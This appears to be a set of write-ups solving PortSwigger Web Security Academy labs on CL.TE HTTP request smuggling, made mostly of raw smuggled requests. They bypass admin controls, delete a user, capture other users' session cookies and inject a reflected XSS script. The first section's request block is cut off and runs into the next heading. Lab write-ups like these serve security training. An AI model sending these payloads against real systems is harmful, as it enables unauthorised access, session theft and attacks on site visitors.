## HTTP request smuggling, basic CL.TE vulnerability
Reference: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te

<!-- omit in toc -->
### Quick Solution
As said in the title this website is vulnerable to a simple CL.TE vulnerability. Payload in the next paragraph.

<!-- omit in toc -->
### Solution
Using Burp Repeater, issue the following request twice:

```
POST / HTTP/1.1

## Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
Reference: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te

<!-- omit in toc -->
### Quick Solution
This lab is divided in two parts. In the first part the goal is to access the ``/admin`` page, in the second part the goal is to delete a user. So two different requests must be sent. Payloads in the next paragraph.

<!-- omit in toc -->
### Solution
1. Try to visit ``/admin`` and observe that the request is blocked.
2. Using Burp Repeater, issue the following request twice:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```
3. Observe that the merged request to ``/admin`` was rejected due to not using the header ``Host: localhost``.
4. Issue the following request twice:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
X-Ignore: X
```
5. Observe that the request was blocked due to the second request's Host header conflicting with the smuggled Host header in the first request.
6. Issue the following request twice so the second request's headers are appended to the smuggled request body instead:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```
7. Observe that you can now access the admin panel.
8. Using the previous response as a reference, change the smuggled request URL to delete the user ``carlos``:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

## Exploiting HTTP request smuggling to reveal front-end request rewriting
Reference: https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting

<!-- omit in toc -->
### Solution
1. Browse to ``/admin`` and observe that the admin panel can only be loaded from ``127.0.0.1``.
2. Use the site's search function and observe that it reflects the value of the ``search`` parameter.
3. Use Burp Repeater to issue the following request twice.
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
```
4. The second response should contain "Search results for" followed by the start of a rewritten HTTP request.
5. Make a note of the name of the`` X-*-IP`` header in the rewritten request, and use it to access the admin panel:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 143
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-abcdef-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```
6. Using the previous response as a reference, change the smuggled request URL to delete the user carlos:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 166
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
X-abcdef-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

```

## Exploiting HTTP request smuggling to capture other users' requests
Reference: https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests

<!-- omit in toc -->
### Solution
1. Visit a blog post and post a comment.
3. Send the ``comment-post`` request to Burp Repeater, shuffle the body parameters so the ``comment`` parameter occurs last, and make sure it still works.
Increase the ``comment-post`` request's ``Content-Length`` to 400, then smuggle it to the back-end server:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=your-session-token

csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
```
4. View the blog post to see if there's a comment containing a user's request. Note that the target user only browses the website intermittently so you may need to repeat this attack a few times before it's successful.
5. Copy the user's Cookie header from the comment, and use it to access their account.

## Exploiting HTTP request smuggling to deliver reflected XSS
Reference: https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss

<!-- omit in toc -->
### Solution
1. Visit a blog post, and send the request to Burp Repeater.
2. Observe that the comment form contains your ``User-Agent`` header in a hidden input.
3. Inject an XSS payload into the ``User-Agent`` header and observe that it gets reflected:
```
"/><script>alert(1)</script>
```
4. Smuggle this XSS request to the back-end server, so that it exploits the next visitor:
```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```
